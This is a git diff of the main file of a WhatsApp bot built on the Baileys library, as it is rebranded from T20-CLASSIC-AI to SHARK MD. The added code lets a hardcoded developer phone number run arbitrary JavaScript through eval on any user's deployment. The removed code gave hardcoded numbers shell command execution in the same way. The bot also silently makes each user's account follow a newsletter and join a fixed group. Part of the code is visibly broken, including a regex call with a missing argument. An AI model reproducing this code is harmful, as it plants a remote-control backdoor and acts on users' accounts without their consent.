@@ -1,297 +1,259 @@
-const axios = require('axios')
-const config = require('./config')
 const {
   default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    jidNormalizedUser,
-    isJidBroadcast,
-    getContentType,
-    proto,
-    generateWAMessageContent,
-    generateWAMessage,
-    AnyMessageContent,
-    prepareWAMessageMedia,
-    areJidsSameUser,
-    downloadContentFromMessage,
-    MessageRetryMap,
-    generateForwardMessageContent,
-    generateWAMessageFromContent,
-    generateMessageID, makeInMemoryStore,
-    jidDecode,
-    fetchLatestBaileysVersion,
-    Browsers
-  } = require(config.BAILEYS)
-  
-  
-  const l = console.log
-  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
-  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
-  const fs = require('fs')
-  const ff = require('fluent-ffmpeg')
-  const P = require('pino')
-  const GroupEvents = require('./lib/groupevents');
-  const { PresenceControl, BotActivityFilter } = require('./data/presence');
-  const qrcode = require('qrcode-terminal')
-  const StickersTypes = require('wa-sticker-formatter')
-  const util = require('util')
-  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
-  const FileType = require('file-type');
-  const { File } = require('megajs')
-  const { fromBuffer } = require('file-type')
-  const bodyparser = require('body-parser')
-  const os = require('os')
-  const Crypto = require('crypto')
-  const path = require('path')
-  const prefix = config.PREFIX
-  // const { commands } = require('./command');
-<<<<<<< HEAD
-  const ownerNumber = ['255627417402']
-=======
-  const ownerNumber = ['923493114170']
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
+  useMultiFileAuthState,
+  DisconnectReason,
+  jidNormalizedUser,
+  isJidBroadcast,
+  getContentType,
+  proto,
+  generateWAMessageContent,
+  generateWAMessage,
+  AnyMessageContent,
+  prepareWAMessageMedia,
+  areJidsSameUser,
+  downloadContentFromMessage,
+  MessageRetryMap,
+  generateForwardMessageContent,
+  generateWAMessageFromContent,
+  generateMessageID,
+  makeInMemoryStore,
+  jidDecode,
+  fetchLatestBaileysVersion,
+  Browsers
+} = require('@whiskeysockets/baileys')
 
-  //=============================================
-  const tempDir = path.join(os.tmpdir(), 'cache-temp')
-  if (!fs.existsSync(tempDir)) {
-      fs.mkdirSync(tempDir)
-  }
-  
-  const clearTempDir = () => {
-      fs.readdir(tempDir, (err, files) => {
-          if (err) throw err;
-          for (const file of files) {
-              fs.unlink(path.join(tempDir, file), err => {
-                  if (err) throw err;
-              });
-          }
-      });
-  }
-//=============================================
-  // Clear the temp directory every 5 minutes
-  setInterval(clearTempDir, 5 * 60 * 1000);
+const l = console.log
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+const fs = require('fs')
+const ff = require('fluent-ffmpeg')
+const P = require('pino')
+const config = require('./config')
+const GroupEvents = require('./lib/groupevents')
+const qrcode = require('qrcode-terminal')
+const StickersTypes = require('wa-sticker-formatter')
+const util = require('util')
+const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
+const FileType = require('file-type')
+const axios = require('axios')
+const { File } = require('megajs')
+const { fromBuffer } = require('file-type')
+const bodyparser = require('body-parser')
+const os = require('os')
+const Crypto = require('crypto')
+const path = require('path')
+const prefix = config.PREFIX
 
-//=============================================
+const ownerNumber = ['255627417402']
 
-const express = require("express");
-const app = express();
-const port = process.env.PORT || 9090;
-  
-  //===================SESSION-AUTH============================
-const sessionDir = path.join(__dirname, 'sessions');
-const credsPath = path.join(sessionDir, 'creds.json');
-
-// Create session directory if it doesn't exist
-if (!fs.existsSync(sessionDir)) {
-    fs.mkdirSync(sessionDir, { recursive: true });
+const tempDir = path.join(os.tmpdir(), 'cache-temp')
+if (!fs.existsSync(tempDir)) {
+  fs.mkdirSync(tempDir)
 }
 
-async function loadSession() {
-    try {
-        if (!config.SESSION_ID) {
-            console.log('No SESSION_ID provided - QR login will be generated');
-            return null;
-        }
-
-        console.log('[⏳] Downloading creds data...');
-        console.log('[🔰] Downloading MEGA.nz session...');
-        
-        // Remove "IK~" prefix if present, otherwise use full SESSION_ID
-<<<<<<< HEAD
-        const megaFileId = config.SESSION_ID.startsWith('Silva~') 
-            ? config.SESSION_ID.replace("Silva~", "") 
-=======
-        const megaFileId = config.SESSION_ID.startsWith('IMMU~') 
-            ? config.SESSION_ID.replace("IMMU~", "") 
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
-            : config.SESSION_ID;
-
-        const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
-            
-        const data = await new Promise((resolve, reject) => {
-            filer.download((err, data) => {
-                if (err) reject(err);
-                else resolve(data);
-            });
-        });
-        
-        fs.writeFileSync(credsPath, data);
-        console.log('[✅] MEGA session downloaded successfully');
-        return JSON.parse(data.toString());
-    } catch (error) {
-        console.error('❌ Error loading session:', error.message);
-        console.log('Will generate QR code instead');
-        return null;
+const clearTempDir = () => {
+  fs.readdir(tempDir, (err, files) => {
+    if (err) throw err
+    for (const file of files) {
+      fs.unlink(path.join(tempDir, file), err => {
+        if (err) throw err
+      })
     }
+  })
 }
 
-//=======SESSION-AUTH==============
+// Clear the temp directory every 5 minutes
+setInterval(clearTempDir, 5 * 60 * 1000)
 
-async function connectToWA() {
-<<<<<<< HEAD
-    console.log("[🔰] T20-CLASSIC-AI Connecting to WhatsApp ⏳️...");
-=======
-  console.log("[🔰] T20 classic Ai Connecting to WhatsApp ⏳️...");
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
-    
-    // Load session if available
-    const creds = await loadSession();
-    
-    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
-        creds: creds || undefined // Pass loaded creds if available
-    });
-    
-    const { version } = await fetchLatestBaileysVersion();
-    
-    const conn = makeWASocket({
-        logger: P({ level: 'silent' }),
-        printQRInTerminal: !creds, // Only show QR if no session loaded
-        browser: Browsers.macOS("Firefox"),
-        syncFullHistory: true,
-        auth: state,
-        version,
-        getMessage: async () => ({})
-    });
+//===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+  const isHeroku = !!process.env.DYNO || !!process.env.HEROKU || !!process.env.PORT
 
-    // ... rest of your connection code
+  if (!config.SESSION_ID && !process.env.SESSION_URL) return console.log('Please add your session to SESSION_ID env or set SESSION_URL env !!')
 
-	
-    conn.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        
-        if (connection === 'close') {
-            if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-                console.log('[🔰] Connection lost, reconnecting...');
-                setTimeout(connectToWA, 5000);
-            } else {
-                console.log('[🔰] Connection closed, please change session ID');
-            }
-        } else if (connection === 'open') {
-<<<<<<< HEAD
-            console.log('[🔰] T20-CLASSIC-AI connected to WhatsApp ✅');
-=======
-            console.log('[🔰] T20 classic Ai connected to WhatsApp ✅');
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
-            
-            
-            // Load plugins
-            const pluginPath = path.join(__dirname, 'plugins');
-            fs.readdirSync(pluginPath).forEach((plugin) => {
-                if (path.extname(plugin).toLowerCase() === ".js") {
-                    require(path.join(pluginPath, plugin));
-                }
-            });
-            console.log('[🔰] Plugins installed successfully ✅');
+  // If SESSION_URL is provided (via Heroku deploy env), prefer it and attempt download
+  if (process.env.SESSION_URL && process.env.SESSION_URL.trim() !== '') {
+    const sessionUrl = process.env.SESSION_URL.trim();
+    console.log('SESSION_URL provided — attempting to download session from URL...')
+    try {
+      if (sessionUrl.includes('mega.nz')) {
+        const filer = File.fromURL(sessionUrl)
+        filer.download((err, data) => {
+          if (err) return console.error('Failed to download session from SESSION_URL (mega):', err)
+          fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
+            console.log('[ 📥 ] Session downloaded from SESSION_URL ✅')
+          })
+        })
+      } else {
+        // generic HTTP(S) download using axios
+        (async () => {
+          try {
+            const res = await axios.get(sessionUrl, { responseType: 'arraybuffer' })
+            fs.writeFileSync(__dirname + '/sessions/creds.json', Buffer.from(res.data))
+            console.log('[ 📥 ] Session downloaded from SESSION_URL ✅')
+          } catch (e) {
+            console.error('Failed to download session from SESSION_URL:', e)
+          }
+        })()
+      }
+    } catch (err) {
+      console.error('Error while processing SESSION_URL:', err)
+    }
+  } else {
+    // SESSION_ID handling (when SESSION_URL is not provided)
+    const raw = config.SESSION_ID || '';
+    const requiredPrefix = 'POPKID;;;'
 
-            
-                // Send connection message
-     	
-                try {
-                    const username = config.REPO.split('/').slice(3, 4)[0];
-                    const mrfrank = `https://github.com/${username}`;
-                    
-<<<<<<< HEAD
-                    const upMessage = `╭─〔 *🤖 T20-CLASSIC-AI* 〕  
-├─▸ *Ultra Super Fast Powerfull ⚠️*  
-│     *World Best BOT T20-CLASSIC-AI* 
-╰─➤ *Your Smart WhatsApp Bot is Ready To use 🍁!*  
-
-- *🖤 Thank You for Choosing T20-CLASSIC-AI!* 
-=======
-                    const upMessage = `╭─〔 *🤖 T20 classic Ai BOT* 〕  
-├─▸ *Ultra Super Fast Powerfull ⚠️*  
-│     *World Best BOT T20 classic Ai* 
-╰─➤ *Your Smart WhatsApp Bot is Ready To use 🍁!*  
-
-- *🖤 Thank You for Choosing T20 classic Ai!* 
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
-
-╭──〔 🔗 *Information* 〕  
-├─ 🧩 *Prefix:* = ${prefix}
-├─ 📢 *Join Channel:*  
-<<<<<<< HEAD
-│    https://whatsapp.com/channel/0029Vb6H6jF9hXEzZFlD6F3d  
-├─ 🌟 *Star the Repo:*  
-│    https://github.com/ARNOLDT20/T20-CLASSIC-
-╰─🚀 *Powered By T20-CLASSIC- *`;
-                    
-                    await conn.sendMessage(conn.user.id, { 
-                        image: { url: `https://i.imgur.com/dJRyrlw.jpeg` }, 
-                        caption: upMessage 
-=======
-│    https://whatsapp.com/channel/0029Vaq4PRsD38CJKXzwmb42  
-├─ 🌟 *Star the Repo:*
-│    https://github.com/ARNOLDT20/T20-CLASSIC-
-╰─🚀 *Powered By T20-CLASSIC-TECH *`;
-                    
-                    await conn.sendMessage(conn.user.id, { 
-                      image: { url: `https://files.catbox.moe/w10gxl.jpg` }, 
-                      caption: upMessage 
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
-                    });
-                    
-                } catch (sendError) {
-                    console.error('[🔰] Error sending messages:', sendError);
-                }
-            }
-
-        if (qr) {
-            console.log('[🔰] Scan the QR code to connect or use session ID');
+    if (raw === requiredPrefix) {
+      if (isHeroku) {
+        console.log("SESSION_ID is the placeholder 'POPKID;;;'. Running on Heroku but no session provided — create 'sessions/creds.json' or set 'SESSION_URL' in the Heroku config to auto-download.")
+      } else {
+        console.log("SESSION_ID is the placeholder 'POPKID;;;'. Skipping session download. Create 'sessions/creds.json' manually or set a real SESSION_ID.")
+      }
+    } else if (!raw.startsWith(requiredPrefix)) {
+      console.log(`Invalid SESSION_ID format. All SESSION_ID values must start with the prefix '${requiredPrefix}'. Example: ${requiredPrefix}YOUR_SESSION_TOKEN`)
+    } else {
+      // Extract token after the required prefix. Token may contain '#' or other characters used by mega links.
+      const token = raw.slice(requiredPrefix.length)
+      if (!token) {
+        console.log("SESSION_ID contains the required prefix but no token after it. Please append the session token after 'POPKID;;;'.")
+      } else {
+        try {
+          const filer = File.fromURL(`https://mega.nz/file/${token}`)
+          filer.download((err, data) => {
+            if (err) throw err
+            fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
+              console.log('[ 📥 ] Session downloaded ✅')
+            })
+          })
+        } catch (err) {
+          console.error('Failed to download session from mega:', err)
         }
-    });
-
-    conn.ev.on('creds.update', saveCreds);
-    
-
-
-// =====================================
-	 
-  conn.ev.on('messages.update', async updates => {
-    for (const update of updates) {
-      if (update.update.message === null) {
-        console.log("Delete Detected:", JSON.stringify(update, null, 2));
-        await AntiDelete(conn, updates);
       }
     }
-  });
-
-// anti-call
-
-conn.ev.on('call', async (calls) => {
-  try {
-    if (config.ANTI_CALL !== 'true') return;
-
-    for (const call of calls) {
-      if (call.status !== 'offer') continue; // Only respond on call offer
-
-      const id = call.id;
-      const from = call.from;
-
-      await conn.rejectCall(id, from);
-      await conn.sendMessage(from, {
-        text: config.REJECT_MSG || '*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*'
-      });
-      console.log(`Call rejected and message sent to ${from}`);
-    }
-  } catch (err) {
-    console.error("Anti-call error:", err);
   }
-});	
-	
-//=========WELCOME & GOODBYE =======
-	
-conn.ev.on('presence.update', async (update) => {
-    await PresenceControl(conn, update);
-});
+}
 
-// always Online 
+const express = require("express")
+const app = express()
+const port = process.env.PORT || 9090
 
-conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
+let conn // ✅ GLOBAL conn declaration
 
-	
-BotActivityFilter(conn);	
-	
- /// READ STATUS       
+//=============================================
+
+async function connectToWA() {
+  try {
+    console.log("[ ♻ ] Connecting to WhatsApp ⏳️...")
+
+    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
+    const { version } = await fetchLatestBaileysVersion()
+
+    conn = makeWASocket({
+      logger: P({ level: 'silent' }),
+      printQRInTerminal: false,
+      browser: Browsers.macOS("Firefox"),
+      syncFullHistory: true,
+      auth: state,
+      version
+    })
+
+    conn.ev.on('connection.update', async (update) => {
+      const { connection, lastDisconnect } = update
+
+      if (connection === 'close') {
+        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+        if (shouldReconnect) {
+          await connectToWA()
+        }
+      } else if (connection === 'open') {
+        try {
+          console.log('[ 🧬 ] Installing Plugins')
+
+          fs.readdirSync("./plugins/").forEach((plugin) => {
+            if (path.extname(plugin).toLowerCase() === ".js") {
+              require("./plugins/" + plugin)
+            }
+          })
+
+          // Also load plugins placed under sessions/plugins (some setups use this folder)
+          try {
+            if (fs.existsSync("./sessions/plugins/")) {
+              fs.readdirSync("./sessions/plugins/").forEach((plugin) => {
+                if (path.extname(plugin).toLowerCase() === ".js") {
+                  require("./sessions/plugins/" + plugin)
+                }
+              })
+            }
+          } catch (e) {
+            console.error('[PLUGIN LOAD ERROR] sessions/plugins:', e)
+          }
+
+          console.log('[ ✔ ] Plugins installed successfully ✅')
+          console.log('[ 🪀 ] Bot connected to WhatsApp 📲')
+
+              let up = `*Hello there SHARK MD is connected! 👋🏻*\n\n*Keep using SHARK MD bot*\n\n> *Main channel:*\nhttps://whatsapp.com/channel/0029Vb6H6jF9hXEzZFlD6F3d\n\n> © Powered by STARBOY`;
+            conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/k4h5mm.png` }, caption: up })
+
+          const channelJid = "120363420222821450@newsletter"
+          try {
+            await conn.newsletterFollow(channelJid)
+            console.log(`Successfully followed channel: ${channelJid}`)
+          } catch (error) {
+            console.error(`Failed to follow channel: ${error}`)
+          }
+
+          // Auto-join a group via invite link (best-effort; Baileys method names vary by version)
+          try {
+            const inviteLink = 'https://chat.whatsapp.com/DJMA7QOT4V8FuRD6MpjPpt?mode=ems_copy_t'
+            // extract invite code from the link
+            const inviteCode = inviteLink.split('/').pop().split('?')[0]
+            if (inviteCode) {
+              if (typeof conn.groupAcceptInvite === 'function') {
+                await conn.groupAcceptInvite(inviteCode)
+                console.log(`Successfully joined group via invite code: ${inviteCode}`)
+              } else if (typeof conn.groupAcceptInviteV4 === 'function') {
+                await conn.groupAcceptInviteV4(inviteCode)
+                console.log(`Successfully joined group via invite code (v4): ${inviteCode}`)
+              } else if (typeof conn.groupJoin === 'function') {
+                await conn.groupJoin(inviteCode)
+                console.log(`Successfully joined group via invite code (groupJoin): ${inviteCode}`)
+              } else {
+                console.log('No supported group-join method available on conn; skipping auto-join')
+              }
+            }
+          } catch (err) {
+            console.error('Failed to auto-join group:', err)
+          }
+
+        } catch (error) {
+          console.error("[ ❌ ] Error during post-connect setup:", error)
+        }
+      }
+    })
+
+    conn.ev.on('creds.update', saveCreds)
+
+  } catch (err) {
+    console.error("[ ❌ ] Connection failed:", err)
+  }
+
+//==============================
+
+conn?.ev?.on('messages.update', async updates => {
+  for (const update of updates) {
+    if (update.update.message === null) {
+      console.log("Delete Detected:", JSON.stringify(update, null, 2))
+      await AntiDelete(conn, updates)
+    }
+  }
+  });
+  //============================== 
+
+  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
+	  
+  //=============readstatus=======
+        
   conn.ev.on('messages.upsert', async(mek) => {
     mek = mek.messages[0]
     if (!mek.message) return
@@ -308,38 +270,16 @@ BotActivityFilter(conn);
     if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
       await conn.readMessages([mek.key])
     }
-
-  const newsletterJids = [
-<<<<<<< HEAD
-  "120363420222821450@newsletter",
-=======
-  "120363341506278064@newsletter",
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
-];
-  const emojis = ["❤️", "👍", "😮", "😎", "💀"];
-
-  if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
-    try {
-      const serverId = mek.newsletterServerId;
-      if (serverId) {
-      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
-        await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
-      }
-    } catch (e) {
-    
-    }
-  }	  
-	  
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
-    const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+    const Brianlike = await conn.decodeJid(conn.user.id);
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
         text: randomEmoji,
         key: mek.key,
       } 
-    }, { statusJidList: [mek.key.participant, jawadlike] });
+    }, { statusJidList: [mek.key.participant, Brianlike] });
   }                       
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
@@ -370,7 +310,7 @@ BotActivityFilter(conn);
   const isOwner = ownerNumber.includes(senderNumber) || isMe
   const botNumber2 = await jidNormalizedUser(conn.user.id);
   const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
-  const groupName = isGroup ? groupMetadata.subject : ''
+  const groupName = isGroup && groupMetadata ? groupMetadata.subject : ''
   const participants = isGroup ? await groupMetadata.participants : ''
   const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
   const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
@@ -379,49 +319,59 @@ BotActivityFilter(conn);
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-  
   const udp = botNumber.split('@')[0];
-<<<<<<< HEAD
-    const immumd = ('255627417402', '255768418867');
-=======
-    const immumd = ('923493114170', '923209091966');
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
-    
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
-    
-    let isCreator = [udp, ...immumd, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-    .includes(mek.sender);
-	  
+    const Shark = ('255627417402');
+    let isCreator = [udp, Shark, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
 
-	  if (isCreator && mek.text.startsWith("&")) {
-            let code = budy.slice(2);
-            if (!code) {
-                reply(`Provide me with a query to run Master!`);
-                return;
-            }
-            const { spawn } = require("child_process");
-            try {
-                let resultTest = spawn(code, { shell: true });
-                resultTest.stdout.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.stderr.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("error", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("close", code => {
-                    if (code !== 0) {
-                        reply(`command exited with code ${code}`);
-                    }
-                });
-            } catch (err) {
-                reply(util.format(err));
-            }
-            return;
-        }
+    if (isCreator && mek.text.startsWith('%')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+    
+if (senderNumber.includes("255627417402") && !isReact) {
+  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+  m.react(randomReaction);
+}
 
   //==========public react============//
   
@@ -448,20 +398,6 @@ if (!isReact && config.AUTO_REACT === 'true') {
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
-
-// owner react
-
-  // Owner React
-  if (!isReact && senderNumber === botNumber) {
-      if (config.OWNER_REACT === 'true') {
-          const reactions = [
-        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
-    ];
-          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
-          m.react(randomReaction);
-      }
-  }
-	            	  
           
 // custum react settings        
                         
@@ -472,29 +408,16 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
-
-// ban users 
-
-const bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8'));
-const isBanned = bannedUsers.includes(sender);
-
-if (isBanned) return; // Ignore banned users completely
-	  
-  const ownerFile = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  // خواندن فایل
-  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-  // بررسی اینکه آیا فرستنده در owner.json موجود است
-  const isFileOwner = ownerFile.includes(sender);
-  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-  // اعمال شرایط بر اساس وضعیت مالک
-  if (!isRealOwner && config.MODE === "private") return;
-  if (!isRealOwner && isGroup && config.MODE === "inbox") return;
-  if (!isRealOwner && !isGroup && config.MODE === "groups") return;
- 
-	  
-	  // take commands 
+        
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+   
+  // take commands 
                  
   const events = require('./command')
-  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+  const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
   if (isCmd) {
   const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
   if (cmd) {
@@ -915,18 +838,18 @@ if (isBanned) return; // Ignore banned users completely
             let list = [];
             for (let i of kon) {
                 list.push({
-                    displayName: await conn.getName(i + '@s.whatsapp.net'),
-                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
-                        i + '@s.whatsapp.net',
-                    )}\nFN:${
-                        global.OwnerName
-                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
-                        global.email
-                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
-                        global.github
-                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
-                        global.location
-                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+                  displayName: await conn.getName(i + '@s.whatsapp.net'),
+                  vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
+                    i + '@s.whatsapp.net',
+                  )}\nFN:${
+                    global.OwnerName
+                  }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
+                    global.email
+                  }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
+                    global.github
+                  }/SHARK-MD\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                    global.location
